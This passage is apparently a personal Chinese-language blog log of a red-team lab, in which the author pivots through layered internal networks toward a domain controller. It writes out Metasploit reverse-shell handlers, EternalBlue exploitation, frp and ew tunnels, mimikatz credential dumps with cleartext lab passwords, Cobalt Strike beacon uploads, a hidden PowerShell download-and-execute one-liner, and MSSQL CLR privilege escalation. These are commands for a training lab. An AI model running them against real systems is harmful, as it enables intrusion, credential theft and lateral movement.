gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_http</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhoat 192.168.0.105</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 1234</span><br></code></pre></td></tr></table></figure><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111114245958.png" alt="image-20211111114245958"><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111114236102.png" alt="image-20211111114236102"></p><p>这里又产生了个误区，这样的派生结果还是进入了10.10.20.12的meterpreter，好家伙之前学的那些ew啥的考自己搭的环境去学都没能真正学到知识，还得是实战配合工具才能学到知识</p><p>用frp建立一个 socks5 隧道试试</p><p>kali配置文件 frps.ini，然后运行：</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111135927103.png" alt="image-20211111135927103"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111134358022.png" alt="image-20211111134358022"></p><p>之后来到目标跳板机器运行 frpc：</p><p> 当然是先上个shell上传frp文件</p><p>放temp文件夹是因为一般都是temp文件夹的权限比较高，当然我们现在是administrator</p><p>当然这里我用的是cs的frp插件</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111140541110.png" alt="image-20211111140541110"></p><p>这个插件用起来看不懂咋用，应该是将frpc.ini传到指定文件夹，下面这个框写下这个目录就行</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111142152835.png" alt="image-20211111142152835"></p><p>不过我直接将这个插件里面文件夹的exe直接传过去配合之前传的frpc.ini然后</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">shell</span> frpc.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">c</span> frpc.ini<br></code></pre></td></tr></table></figure><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111142720421.png" alt="image-20211111142720421"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111142244819.png" alt="image-20211111142244819"></p><p>省的麻烦</p><p><img src="C:\Users\e'e't\Desktop\image-20211111142814692.png" alt="image-20211111142814692"></p><h3 id="建立好-socks5-隧道后-Metasploit-对其利用拿到-Meterpreter-会话："><a href="#建立好-socks5-隧道后-Metasploit-对其利用拿到-Meterpreter-会话：" class="headerlink" title="建立好 socks5 隧道后 Metasploit 对其利用拿到 Meterpreter 会话："></a>建立好 socks5 隧道后 Metasploit 对其利用拿到 Meterpreter 会话：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; setg Proxies socks5:192.168.0.105:7777<br>msf6 &gt; setg ReverseAllowProxy <span class="hljs-literal">true</span><br>msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue<br>msf6 &gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br>msf6 &gt; <span class="hljs-built_in">set</span> rhost 10.10.20.7<br>msf6 &gt; run<br></code></pre></td></tr></table></figure><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111144538232.png" alt="image-20211111144538232"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111144649356.png" alt="image-20211111144649356"></p><p>ok</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111144803194.png" alt="image-20211111144803194"></p><p>通过调用 mimikatz 成功抓到其域用户的密码</p><p>load mimikatz</p><p>creds_all</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111145232823.png" alt="image-20211111145232823"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111145329988.png" alt="image-20211111145329988"></p><p>解一下hash</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Username  <span class="hljs-keyword">Domain</span>   <span class="hljs-keyword">Password</span><br>saul      REDTEAM  <span class="hljs-keyword">admin</span>!@#<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><h4 id="中转上线到-CobaltStrike-进行二层内网域渗透-有几种方法"><a href="#中转上线到-CobaltStrike-进行二层内网域渗透-有几种方法" class="headerlink" title="中转上线到 CobaltStrike 进行二层内网域渗透 有几种方法"></a><strong>中转上线到 CobaltStrike 进行二层内网域渗透</strong> 有几种方法</h4><p>1.meterpreter配置端口外带到cs，方法地址如下，不行  进的使meterpreter</p><p><a href="http://www.caiyuhuan.com/index.php/article/lian_fengdingbin_/132.html">http://www.caiyuhuan.com/index.php/article/lian_fengdingbin_/132.html</a></p><p>2.设置中转（反向代理）</p><p>因为此 Win7 不出网，随后只能通过 CobaltStrike 设置中转：</p><p>这里换了kali：192.168.0.124</p><p>操作：</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111161315991.png" alt="image-20211111161315991"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111161308168.png" alt="image-20211111161308168"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111161503437.png" alt="image-20211111161503437"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111161553739.png" alt="image-20211111161553739"></p><p>然后用这个监听器生成一个exe程序，然后用meterpreter的upload上传到10.10.20.7</p><p>然后在用meterpreter调用cmd运行它</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">upload <span class="hljs-regexp">/var/</span>tmp<span class="hljs-regexp">/FrpProPlugin-mainfrp0.33可转发至cs/</span>beacon.exe C:\\windows\\system32\<br></code></pre></td></tr></table></figure><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111164206425.png" alt="image-20211111164206425"></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">execute -f C:<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>system32\beacon.exe<br></code></pre></td></tr></table></figure><p>或cs创建powershell.ps</p><p>直接merterpreter执行cmd执行powershell</p><p>execute怎么样都上不了线，本地把载荷也传过去，也上不了线</p><h4 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sas">电脑带不动了：一周学习新思路小插曲：<br>1.chcp 65001后可以使meterpreter摆脱cmd乱码执行cmd命令 no<br><br>2.meterpreter先stuid提权在执行命令试试  no<br><br>3.试试那个wblogic靶场可不可以放个c2.exe到10.10.20.7 看下能不能上线<br><br>4.看看10.10.20.7能不能出网，能出网的话直接反向连接到cs服务器<br><br>5.或者直接跳过这个上线阶段，通过meterpreter进行域渗透<br><br>6.https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==<span class="hljs-variable">&amp;mid</span>=2247494697<span class="hljs-variable">&amp;idx</span>=1<span class="hljs-variable">&amp;sn</span>=fe344059f859c43f6c9621aafd82f4aa<span class="hljs-variable">&amp;chksm</span>=cf4e6348f839ea5e10ccac6529e6097545b8087d1302d7a148467436f7ab123b01724ac2464d<span class="hljs-variable">&amp;mpshare</span>=1<span class="hljs-variable">&amp;scene</span>=23<span class="hljs-variable">&amp;srcid</span>=1118HRmMzE7nYwTFY8HsvrF4<span class="hljs-variable">&amp;sharer_sharetime</span>=1637199481433<span class="hljs-variable">&amp;sharer_shareid</span>=d6f91fc924ad833bb5231d972b990ef9#rd<br><br>cs配合msf的别的方法（利用meterpreter）<br><br>7.在上传frp把它代理出来<br>8.将cs载荷带进内网<br></code></pre></td></tr></table></figure><p>ok 内存条换了，继续</p><p>1方法和2方法是我直接再10.10.20.7放中转后的payload并运行都不能上线，所以这些也没用</p><p>3方法因为c2对二层网络没用，所以这不算是方法</p><p>4方法因为目标不能出网，所以不行</p><p>5方法暂时不管</p><p>这里用6试试</p><p>因为拿到了，meterpreter，试试创建钓鱼站点并使靶机运行poweshell连接上线</p><p>这里在CS中利用Attacks-&gt; Web Drive-by -&gt; Scripted Web Delivery 来部署一个Payload分发站点：</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211121165837437.png" alt="image-20211121165837437"></p><p>主机地址和端口就是钓鱼站点，因为我们看了内网中转监听，把主机地址 和监听器都换成</p><p>10.10.20.12试试</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211121165212413.png" alt="image-20211121165212413"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell.exe -nop -w <span class="hljs-keyword">hidden</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.10.20.12:80/a&#x27;))&quot;</span><br></code></pre></td></tr></table></figure><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211121170132881.png" alt="image-20211121170132881"></p><p>不行</p><p>后来用靶机ping一下10.10.20.12发现ping不通&#x3D; &#x3D;</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211121170314353.png" alt="image-20211121170314353"></p><p>但是我们msf用10.10.20.12可以打进10.10.20.7，但是10.10.20.7ping不通10.10.20.12</p><p>这个应该使防火墙设置原因，和其它无关</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211121172451306.png" alt="image-20211121172451306"></p><p>可以看到两个权限不一样</p><p>meterpreter运行cd c:\users\saul\desktop</p><p>dir</p><p>beacon.exe试一下</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211121173403553.png" alt="image-20211121173403553"></p><p>看下cs还是不能上线</p><p>7.frp代理</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211121180229882.png" alt="image-20211121180229882"></p><p>好的  还是不行。原来是没有搭建域环境，累了</p><p>先整其他的靶场吧</p><p>好了  其他靶场整完额，先改一下这些虚拟机的dns和ip</p><p>第一层192.168.0</p><p>第二层10.10.20</p><p>第三层10.10.10</p><p>10.10.20.7   ping不了10.10.20.12是因为10.10.20.12网络发现没有打开</p><p>现在kaliip为192.168.0.124</p><p>好  先把之前做过的再做一遍:yellow_heart:</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211130190143912.png" alt="image-20211130190143912"></p><p>果然是网络配置的问题（weblogic服务器主机配置了“关闭网络发现”）</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211130190200699.png" alt="image-20211130190200699"></p><h4 id="为什么启动不了网络发现"><a href="#为什么启动不了网络发现" class="headerlink" title="为什么启动不了网络发现"></a>为什么启动不了网络发现</h4><p>有意思的是一开始我关闭网络发现后全是10.10.20.7ping不了10.10.20.12</p><p>后来我启用网络发现后直接关闭这个窗口了   然后去10.10.20.7那台主机</p><p>发现可以ping10.10.20.12，但是当我再次打开这个窗口时发现此时是“关闭网络发现”</p><p>但是两者都是可以互相ping通的，我也不知道啥原因</p><p>1.按下WIN+R，然后输入services.msc 回车</p><p>2、然后检查以下几个服务，看是否为启动状态；</p><p>　　Function Discovery Resource Publication</p><p>　　SSDP Discovery</p><p>　　UPnP Device Host</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211130191635347.png" alt="image-20211130191635347"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211130191750030.png" alt="image-20211130191750030"></p><p>这样就可以</p><p>那么上述步骤怎么用指令来操作呢</p><p>这就需要逐步cmd或者powshell指令操作了</p><p>但是目前只找到了可以cmd直接打开services.msc，但是你用cs执行这个命令的话是回显不出来的，但是人家电脑上看的到:joy:  把这个列为未来计划  后来加以补充</p><p>后面找到了还有这些方法</p><p>方法二：</p><p>reg add 将新的子项或项添加到注册表中</p><p>　　语法：reg add KeyName [&#x2F;v EntryName|&#x2F;ve] [&#x2F;t DataType] [&#x2F;s separator] [&#x2F;d value] [&#x2F;f]</p><p>这种命令叫DOS命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">参数<br><br>　　KeyName<br><br>　　指定子项的完全路径。对于远程计算机，请在\\ComputerName\PathToSubkey中的子项路径前包含计算机名称。忽略ComputerName会导致默认对本地计算机进行操作。以相应的子目录树开始路径。有效子目录树为HKLM、HKCU、HKCR、HKU以及HKCC。<br><br>　　/v EntryName<br><br>　　删除子项下的特定项。如果未指定项，则将删除子项下的所有项和子项。<br><br>　　/ve<br><br>　　指定只可以删除为空值的项。<br><br>　　/va<br><br>　　删除指定子项下的所有项。使用本参数不能删除指定子项下的子项。<br><br>　　/f<br><br>　　无需请求确认而删除现有的注册表子项或项。<br><br>　　/?<br><br>　　在命令提示符显示帮助。<br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash"> /k reg delete <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe&quot;</span> /f（任务栏里的任务管理器为灰色）</span><br><br>　　<span class="hljs-keyword">cmd</span><span class="language-bash"> /k reg delete <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg&quot;</span> /f（删除MSConfig启动里的未勾选项目）</span><br><br>　　<span class="hljs-keyword">cmd</span><span class="language-bash"> /k reg delete <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ctfmon.exe&quot;</span> /f（删除CTFMON的镜像劫持）</span><br><br>　　<span class="hljs-keyword">cmd</span><span class="language-bash"> /k reg delete <span class="hljs-string">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TrayNotify&quot;</span> /v IconStreams /f</span><br><br>　　<span class="hljs-keyword">cmd</span><span class="language-bash"> /k reg delete <span class="hljs-string">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TrayNotify&quot;</span> /v PastIconsStream /f（删除通知区域的历史记录）</span><br></code></pre></td></tr></table></figure><p>而注册表和服务在（权限维持）后门持久化中也占有重要作用：开代理和挂载荷啥的</p><p>参考：<a href="https://www.baidu.com/link?url=Zemob89xtz4ZFM1uQG4ftTrPUbN_Lb9NpehE3Gr-s9iDDblEz9T-SOM1d0CqE3ejmpsfMv4t09FWnxsYMsGOGaN53ZD8ACzPOAvSbv0LaUe&wd=&eqid=e34484b600034bfd0000000661a72954">https://www.baidu.com/link?url=Zemob89xtz4ZFM1uQG4ftTrPUbN_Lb9NpehE3Gr-s9iDDblEz9T-SOM1d0CqE3ejmpsfMv4t09FWnxsYMsGOGaN53ZD8ACzPOAvSbv0LaUe&amp;wd=&amp;eqid=e34484b600034bfd0000000661a72954</a></p><p><a href="https://www.cnblogs.com/fanyf/p/4221488.html">https://www.cnblogs.com/fanyf/p/4221488.html</a></p><h4 id="这里又不得不提到一个后门持久化的图形化工具了"><a href="#这里又不得不提到一个后门持久化的图形化工具了" class="headerlink" title="这里又不得不提到一个后门持久化的图形化工具了"></a>这里又不得不提到一个后门持久化的图形化工具了</h4><p>，当然也可以直接使用reg命令打开（说实话reg命令不太好搞，因为不知道各个指令的详细操作（对应工具的部位命令），后面会做一次专题）。不过其实也不需要用到图形化工具，reg里面可以直接用，重要的还是要使用命令启用reg</p><p>就是说，我都能启用图形化工具了，那我直接去regit里面创建服务不就行了。还不用下载工具</p><p>不过工具多的是稳定性（怕你不会配置啥的）:sheep:</p><p>有个工具nnsm  可以看这个</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247492683&idx=1&sn=03023cbaf80496045a1cf936a7ffb41d&chksm=ce5dc62af92a4f3c9930c7603b59117f36e8c5f6f76775a4370de83de6f3847e53e38901a28e&mpshare=1&scene=23&srcid=1130tq01JPNO0cLQpaPGxWRz&sharer_sharetime=1638271197400&sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd">https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&amp;mid=2247492683&amp;idx=1&amp;sn=03023cbaf80496045a1cf936a7ffb41d&amp;chksm=ce5dc62af92a4f3c9930c7603b59117f36e8c5f6f76775a4370de83de6f3847e53e38901a28e&amp;mpshare=1&amp;scene=23&amp;srcid=1130tq01JPNO0cLQpaPGxWRz&amp;sharer_sharetime=1638271197400&amp;sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd</a></p><h4 id="怎样启动网络发现（用指令）"><a href="#怎样启动网络发现（用指令）" class="headerlink" title="怎样启动网络发现（用指令）"></a>怎样启动网络发现（用指令）</h4><p>那实战中遇到这种情况有什么方法吗？</p><p>首先要把防火墙关掉是肯定的</p><p>win7（其他版本还没试过，不过应该都行）有下面几个个方法</p><ol><li><p>新建一个记事本文件，在里面输入内容：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">@echo <span class="hljs-keyword">off</span><br>:Win7网络发现依赖的服务:<br>:DnscacheDNS Client<br>:SSDPSRVSSDP Discovery<br>:PlugPlayPlug <span class="hljs-keyword">and</span> Play<br>:FDResPub<span class="hljs-keyword">Function</span> Discovery Resource <span class="hljs-keyword">Publication</span> 功能发现资源发布<br>sc query SSDPSRV|findstr /i &quot;SSDPSRV state&quot;<br>sc query Dnscache|findstr /i &quot;Dnscache state&quot;<br>sc query PlugPlay|findstr /i &quot;PlugPlay state&quot;<br>sc query FDResPub|findstr /i &quot;FDResPub state&quot;<br>sc config SSDPSRV start= AUTO<br>sc config Dnscache start= AUTO<br>sc config PlugPlay start= AUTO<br>sc config FDResPub start= AUTO<br>sc <span class="hljs-keyword">start</span> SSDPSRV<br>sc <span class="hljs-keyword">start</span> Dnscache<br>sc <span class="hljs-keyword">start</span> PlugPlay<br>sc <span class="hljs-keyword">start</span> FDResPub<br></code></pre></td></tr></table></figure><p>然后保存为TurnOnNetworkDiscovey.bat。</p><p>双击运行TurnOnNetworkDiscovey.bat</p></li></ol><p>继续继续</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211130193820591.png" alt="image-20211130193820591"></p><p>先提权</p><p>再shell net user &#x2F;domain看下域用户</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211130193855997.png" alt="image-20211130193855997"></p><p>net group “Domain Controllers” &#x2F;domian  定位到域控 DC IP 为：<code>10.10.10.8</code></p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLialJ6FhvuRV0FEM47XO6pZQB03yQiaiaficd1xkP4IkuNGu4ES7elEz7Wg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="å¾ç"></p><p>拿DC、</p><p>首先当前进程是没有域管的，所以暂且放弃令牌窃取：</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201165829111.png" alt="image-20211201165829111"></p><p>传个Adfind上去</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">AdFind 一款C</span><span class="hljs-literal">++</span><span class="hljs-comment">编写的域内查询信息的工具</span> <br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">shell</span> AdFind.<span class="hljs-keyword">exe</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">10.8</span> -<span class="hljs-keyword">u</span> saul -<span class="hljs-keyword">up</span> admin!@#<span class="hljs-number">45</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=redteam,DC=red&quot;</span> -<span class="hljs-keyword">f</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> <span class="hljs-keyword">cn</span> distinguishedName msds-allowedtodelegateto<br></code></pre></td></tr></table></figure><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201171644695.png" alt="image-20211201171644695"></p><p>找到了一个 sqlserver 的用户是被设置了约束委派，得想办法搞到这个用户的账密。</p><p>传个fscan上去扫一下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">shell</span> fscan.exe -np -h <span class="hljs-number">10.10.10.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201172138319.png" alt="image-20211201172138319"></p><p>发现 sqlserver 这台机器开放了 80、1433（mssql）：</p><p>ew配合sock64加代理一下railgun对sql进行爆破</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201172809091.png" alt="image-20211201172809091"></p><p>这次代理就有难度了</p><p>因为10.10.10.18是在第三层</p><p>而win主机在第一层，ping不到第三层。</p><p>刚好ew是适合三层代理的</p><p>先分析一下局势</p><p>win是192.168</p><p>第二层是（192.168.0.154）10.10.20.12    （10.10.20.7）10.10.10.7</p><p>第三层代理地址 10.10.10.7  目标10.10.10.18</p><p>kali执行</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">./ew_for_Linux32</span> <span class="hljs-string">-s</span> <span class="hljs-string">lcx_listen</span> <span class="hljs-string">-l</span>  <span class="hljs-number">1080</span>   <span class="hljs-string">-e</span> <span class="hljs-number">1024</span><br></code></pre></td></tr></table></figure><p>10.10.20.12执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew_for_Win</span>.exe -s ssocksd    -l <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>10.10.10.7执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew_for_Win</span>.exe -s lcx_slave  -d <span class="hljs-number">192.168.0.124</span> -e <span class="hljs-number">1024</span> -f <span class="hljs-number">10.10.20.12</span> -g <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201181632862.png" alt="image-20211201181632862"></p><p>无法连接  哪里出了问题?</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201183329083.png" alt="image-20211201183329083"></p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201183334564.png" alt="image-20211201183334564"></p><p>这两个都开着  但是没连上</p><p>换一个  将weblogic的命令改为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew_for_Win</span>.exe -s lcx_tran   -l  <span class="hljs-number">1080</span>   -f <span class="hljs-number">10.10.20.12</span> -g <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>不管了  那就直接开3389 </p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201194201408.png" alt="image-20211201194201408"></p><p>多重开启   （10.10.20.7和10.10.20.12 都开）</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201194617548.png" alt="image-20211201194617548"></p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201195017882.png" alt="image-20211201195017882"></p><p>ok</p><p>目标是 iis，那么想办法找到 iis 到目录写个一句话吧。</p><p>一般 iis 的目录是：<code>C:\inetpub\wwwroot</code>，那么查看下是否存在：</p><p>存在是存在      但是不能写文件</p><p>使用 SharpSQLTools 开启目标 clr：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">SharpSQLTools.exe <span class="hljs-number">10.10</span>.<span class="hljs-number">10.18</span> sa sa <span class="hljs-keyword">master</span> <span class="hljs-title">install_clr</span> whoami<br></code></pre></td></tr></table></figure><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201195805667.png" alt="image-20211201195805667"></p><p>然后启用并调用命令：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">SharpSQLTools.exe <span class="hljs-number">10.10</span>.<span class="hljs-number">10.18</span> sa sa <span class="hljs-keyword">master</span> <span class="hljs-title">enable_clr</span><br>SharpSQLTools.exe <span class="hljs-number">10.10</span>.<span class="hljs-number">10.18</span> sa sa <span class="hljs-keyword">master</span> <span class="hljs-title">clr_efspotato</span> whoami<br></code></pre></td></tr></table></figure><p>这下子就是一个系统权限了！</p><p>随后添加了一个管理员：</p><p>但还是不能写一句话</p><p>还是用 MSF 把：</p><p>exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_clr_payload</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201200102319.png" alt="image-20211201200102319"></p><p>然后找到了一个可读可写目录上传 exe 成功，然后中转再上线到 CobaltStrike：</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201200125464.png" alt="image-20211201200125464"></p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201200809694.png" alt="image-20211201200809694"></p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201200817177.png" alt="image-20211201200817177"></p><p>成功上线</p><p>提个权</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201201127547.png" alt="image-20211201201127547"></p><p>mimikatz抓一下密码</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201201537348.png" alt="image-20211201201537348"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">user</span> <span class="hljs-title">: redteam</span>\sqlserverpass : Server12345<br></code></pre></td></tr></table></figure><p>之前信息搜集的时候我们知道 <code>sqlserver</code> 是一个约束委派的用户，我们可以通过</p><h3 id="约束委派攻击来接管域控。"><a href="#约束委派攻击来接管域控。" class="headerlink" title="约束委派攻击来接管域控。"></a>约束委派攻击来接管域控。</h3><p>1.利用 kekeo 请求该用户的 